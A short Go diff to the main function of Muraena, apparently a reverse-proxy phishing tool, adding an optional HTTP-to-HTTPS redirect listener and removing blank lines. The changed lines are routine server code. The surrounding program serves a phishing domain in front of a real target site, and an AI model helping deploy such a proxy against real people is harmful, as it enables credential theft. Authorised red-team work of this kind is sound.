@@ -101,9 +101,6 @@ func main() {
 		s.HandleFood(w, r)
 	})
 
-
-
-
 	listeningAddress := fmt.Sprintf("%s:%d", sess.Config.Proxy.Listener.IP, sess.Config.Proxy.Listener.Port)
 	lline := fmt.Sprintf("Muraena is alive on %s\n[ %s ] ==> [ %s ]", tui.Green(listeningAddress),
 		tui.Yellow(sess.Config.Proxy.Phishing), tui.Green(sess.Config.Proxy.Target))
@@ -116,6 +113,12 @@ func main() {
 			CertPool: sess.Config.TLS.Root,
 		}
 
+		if sess.Config.Proxy.Listener.HTTPtoHTTPS.Enabled {
+			// redirect HTTP > HTTPS
+			listingHTTP := fmt.Sprintf("%s:%d", sess.Config.Proxy.Listener.IP, sess.Config.Proxy.Listener.HTTPtoHTTPS.HTTPport)
+			go http.ListenAndServe(listingHTTP, proxy.RedirectToHTTPS(sess.Config.Proxy.Listener.Port))
+		}
+
 		if err := tlsServer.ServeTLS(listeningAddress); err != nil {
 			log.Fatal("Error binding Muraena on HTTPS: %s", err)
 		}
@@ -125,6 +128,5 @@ func main() {
 			log.Fatal("Error binding Muraena on HTTP: %s", err)
 		}
 	}
-
 
 }
